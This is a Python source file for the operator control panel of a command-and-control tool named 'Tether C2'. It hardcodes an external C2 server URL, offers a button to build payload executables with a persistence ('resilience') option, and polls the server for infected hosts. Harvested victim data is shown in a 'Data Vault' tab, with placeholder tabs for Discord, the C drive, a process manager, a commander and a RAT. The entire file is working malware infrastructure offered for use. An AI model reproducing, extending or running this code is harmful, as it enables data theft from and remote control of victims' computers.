import customtkinter as ctk
from tkinter import filedialog, messagebox
import requests
import threading
import time
import re

from ..builder import build_payload

C2_SERVER_URL = "https://tether-c2-communication-line-by-ebowluh.onrender.com"

class App(ctk.CTk):
    def __init__(self):
        super().__init__()

        self.sessions = {}
        self.session_widgets = {} # Will store a dict of widgets for each session

        # Detail view widgets
        self.detail_view_tab_buttons = {}
        self.detail_view_content_textbox = None
        self.detail_view_data_map = {}

        # --- Window Setup ---
        self.title("Tether C2")
        self.geometry("1024x600")
        self.grid_columnconfigure(0, weight=1)
        self.grid_rowconfigure(1, weight=1)

        # --- Main View Frames ---
        self.home_frame = ctk.CTkFrame(self, fg_color="transparent")
        self.home_frame.grid(row=0, column=0, rowspan=2, sticky="nsew")
        self.home_frame.grid_columnconfigure(0, weight=1)
        self.home_frame.grid_rowconfigure(2, weight=1)

        self.session_detail_frame = ctk.CTkFrame(self, fg_color="transparent")

        # --- Populate and Start ---
        self.setup_home_frame_widgets()
        self.start_polling()

    def setup_home_frame_widgets(self):
        # --- Builder Frame (Unchanged) ---
        builder_frame = ctk.CTkFrame(self.home_frame, corner_radius=0)
        builder_frame.grid(row=0, column=0, columnspan=2, sticky="ew", padx=10, pady=10)
        builder_frame.grid_columnconfigure(1, weight=1)
        ctk.CTkLabel(builder_frame, text="Payload Name:").grid(row=0, column=0, padx=(10, 5), pady=10, sticky="w")
        self.payload_name_entry = ctk.CTkEntry(builder_frame, placeholder_text="my_payload")
        self.payload_name_entry.grid(row=0, column=1, columnspan=2, sticky="ew", padx=5, pady=10)
        self.resilience_var = ctk.BooleanVar(value=True)
        ctk.CTkCheckBox(builder_frame, text="Enable Resilience", variable=self.resilience_var).grid(row=1, column=0, padx=(10, 5), pady=5, sticky="w")
        self.debug_mode_var = ctk.BooleanVar(value=False)
        ctk.CTkCheckBox(builder_frame, text="Debug Mode (Show Console)", variable=self.debug_mode_var).grid(row=1, column=1, padx=5, pady=5, sticky="w")
        self.build_button = ctk.CTkButton(builder_frame, text="Build Payload", command=self.build_payload_handler)
        self.build_button.grid(row=0, column=3, rowspan=2, padx=(5, 10), pady=10, sticky="ns")
        
        # --- Sessions Header ---
        sessions_label_frame = ctk.CTkFrame(self.home_frame, corner_radius=0, fg_color="transparent")
        sessions_label_frame.grid(row=1, column=0, columnspan=2, padx=10, pady=(10, 0), sticky="ew")
        self.sessions_label = ctk.CTkLabel(sessions_label_frame, text="Active Sessions", font=ctk.CTkFont(weight="bold"))
        self.sessions_label.pack()
        
        # --- Sessions Frame ---
        self.sessions_frame = ctk.CTkScrollableFrame(self.home_frame, corner_radius=0)
        self.sessions_frame.grid(row=2, column=0, columnspan=2, padx=10, pady=(0, 10), sticky="nsew")

    def start_polling(self):
        self.polling_active = True
        self.poll_thread = threading.Thread(target=self.poll_for_sessions, daemon=True)
        self.poll_thread.start()
        self.protocol("WM_DELETE_WINDOW", self.on_closing)

    # --- VIEW SWITCHING AND DATA DISPLAY LOGIC (HEAVILY MODIFIED) ---
    def show_home_view(self):
        self.session_detail_frame.grid_forget()
        self.home_frame.grid(row=0, column=0, rowspan=2, sticky="nsew")

    def show_session_data(self, session_id):
        session_data = self.sessions.get(session_id)
        if not session_data: return

        self.home_frame.grid_forget()
        # Clear any old widgets
        for widget in self.session_detail_frame.winfo_children(): widget.destroy()
        self.session_detail_frame.grid(row=0, column=0, rowspan=2, sticky="nsew", padx=10, pady=10)
        self.session_detail_frame.grid_columnconfigure(0, weight=1)
        self.session_detail_frame.grid_rowconfigure(1, weight=1)

        # --- Main Header ---
        header_frame = ctk.CTkFrame(self.session_detail_frame, fg_color="transparent")
        header_frame.grid(row=0, column=0, sticky="ew", pady=(0, 10))
        ctk.CTkButton(header_frame, text="< Back to Sessions", command=self.show_home_view).pack(side="left")
        ctk.CTkLabel(header_frame, text=session_data.get('hostname', 'N/A'), font=ctk.CTkFont(size=16, weight="bold")).pack(side="left", padx=20)

        # --- MASTER TAB VIEW ---
        master_tab_view = ctk.CTkTabview(self.session_detail_frame)
        master_tab_view.grid(row=1, column=0, sticky="nsew")

        # Add all the top-level tabs
        master_tab_view.add("Data Vault")
        master_tab_view.add("Discord")
        master_tab_view.add("C Drive")
        master_tab_view.add("Process Manager")
        master_tab_view.add("Commander")
        master_tab_view.add("RAT")
        master_tab_view.add("Events")
        master_tab_view.set("Data Vault") # Set the default tab

        # --- Populate the "Data Vault" Tab ---
        data_vault_tab = master_tab_view.tab("Data Vault")
        data_vault_tab.grid_columnconfigure(1, weight=1) # Content panel takes most space
        data_vault_tab.grid_rowconfigure(0, weight=1)
        
        # Create the Left Side Panel for data categories
        tab_panel = ctk.CTkScrollableFrame(data_vault_tab, width=200, corner_radius=0)
        tab_panel.grid(row=0, column=0, sticky="nsw", padx=(0, 5))

        # Create the Right Content Panel for displaying data
        content_panel = ctk.CTkFrame(data_vault_tab, corner_radius=0, fg_color="transparent")
        content_panel.grid(row=0, column=1, sticky="nsew")
        content_panel.grid_rowconfigure(0, weight=1); content_panel.grid_columnconfigure(0, weight=1)
        self.detail_view_content_textbox = ctk.CTkTextbox(content_panel, wrap="word", corner_radius=0)
        self.detail_view_content_textbox.grid(row=0, column=0, sticky="nsew")
        
        # Parse the data and populate the side panel
        self.detail_view_tab_buttons = {}
        harvested_text = session_data.get("data", "No data available.")
        pattern = re.compile(r"--- (.*?) ---\n\n(.*?)(?=\n\n---|\Z)", re.DOTALL)
        matches = pattern.findall(harvested_text)
        self.detail_view_data_map = {title.strip(): content.strip() for title, content in matches}

        if self.detail_view_data_map:
            for title in self.detail_view_data_map.keys():
                button = ctk.CTkButton(tab_panel, text=title, anchor="w", fg_color="transparent", command=lambda t=title: self.update_content_view(t))
                button.pack(fill="x", padx=5, pady=2)
                self.detail_view_tab_buttons[title] = button
            first_tab_title = list(self.detail_view_data_map.keys())[0]
            self.update_content_view(first_tab_title)
            
        # --- Populate the EMPTY Tabs with placeholders ---
        for tab_name in ["Discord", "C Drive", "Process Manager", "Commander", "RAT", "Events"]:
            tab = master_tab_view.tab(tab_name)
            label = ctk.CTkLabel(tab, text=f"'{tab_name}' functionality not yet implemented.", font=ctk.CTkFont(size=14))
            label.pack(expand=True, padx=20, pady=20)

    def update_content_view(self, selected_title):
        content = self.detail_view_data_map.get(selected_title, "Content not found.")
        self.detail_view_content_textbox.configure(state="normal")
        self.detail_view_content_textbox.delete("0.0", "end")
        self.detail_view_content_textbox.insert("0.0", content)
        self.detail_view_content_textbox.configure(state="disabled")
        for title, button in self.detail_view_tab_buttons.items():
            button.configure(fg_color="gray20" if title == selected_title else "transparent")

    # ---UNCHANGED METHODS (EXCEPT FOR add_session_button)---

    def on_closing(self):
        self.polling_active = False; self.destroy()

    def poll_for_sessions(self):
        while self.polling_active:
            try:
                response = requests.get(C2_SERVER_URL + "/api/get_sessions", timeout=10)
                response.raise_for_status(); server_sessions = response.json()
                self.after(0, self.update_gui_with_sessions, server_sessions)
            except requests.exceptions.RequestException as e:
                self.after(0, self.update_sessions_label, f"Error Connecting: {e.__class__.__name__}")
            time.sleep(5)

    def update_sessions_label(self, text): self.sessions_label.configure(text=text)

    def update_gui_with_sessions(self, server_sessions):
        self.update_sessions_label(f"Active Sessions ({len(server_sessions)})")
        current_session_ids = {s["session_id"] for s in server_sessions}
        
        for session_data in server_sessions:
            sid = session_data["session_id"]
            if sid not in self.session_widgets:
                self.sessions[sid] = session_data; self.add_session_widgets(sid, session_data["hostname"])
            is_active = (time.time() - session_data.get("last_seen", 0)) < 45
            self.session_widgets[sid]["button"].configure(fg_color="green" if is_active else "orange")

        for sid in list(self.session_widgets.keys()):
            if sid not in current_session_ids:
                self.session_widgets[sid]["frame"].destroy()
                del self.session_widgets[sid]; del self.sessions[sid]

    def build_payload_handler(self):
        payload_name = self.payload_name_entry.get()
        if not payload_name or not payload_name.isalnum():
            messagebox.showerror("Error", "Payload Name must be alphanumeric."); return
        output_dir = filedialog.askdirectory(title="Select Save Directory")
        if not output_dir: return

        self.build_button.configure(state="disabled", text="Building..."); self.update_idletasks()
        success = build_payload(
            payload_name=payload_name, c2_url=C2_SERVER_URL,
            resilience_enabled=self.resilience_var.get(),
            output_dir=output_dir, debug_mode=self.debug_mode_var.get()
        )
        if success: messagebox.showinfo("Success", f"Payload '{payload_name}.exe' built!")
        else: messagebox.showerror("Build Failed", "Error during build. Check console.")
        self.build_button.configure(state="normal", text="Build Payload")

    # --- MODIFIED: Creates a frame with both the session and delete buttons ---
    def add_session_widgets(self, session_id, hostname):
        container_frame = ctk.CTkFrame(self.sessions_frame, fg_color="transparent")
        container_frame.pack(fill="x", padx=5, pady=2)
        container_frame.grid_columnconfigure(0, weight=1) # Main button takes most space

        session_button = ctk.CTkButton(container_frame, text=f"  {hostname}  |  {session_id[:8]}...  ", command=lambda sid=session_id: self.show_session_data(sid))
        session_button.grid(row=0, column=0, sticky="ew", padx=(0, 5))

        delete_button = ctk.CTkButton(container_frame, text="X", width=30, fg_color="firebrick", hover_color="darkred", command=lambda sid=session_id: self.delete_session_handler(sid))
        delete_button.grid(row=0, column=1, sticky="e")

        self.session_widgets[session_id] = {"frame": container_frame, "button": session_button}

    # --- NEW: Handler for the delete button ---
    def delete_session_handler(self, session_id):
        hostname = self.sessions.get(session_id, {}).get("hostname", session_id[:8])
        if messagebox.askyesno("Confirm Deletion", f"Are you sure you want to permanently delete session '{hostname}'?"):
            try:
                response = requests.post(C2_SERVER_URL + "/api/delete_session", json={"session_id": session_id}, timeout=10)
                response.raise_for_status()
                print(f"[GUI] Deletion command sent for session {session_id}")
                # The automatic polling will remove the button from the UI.
            except requests.exceptions.RequestException as e:
                messagebox.showerror("Error", f"Failed to send delete command: {e}")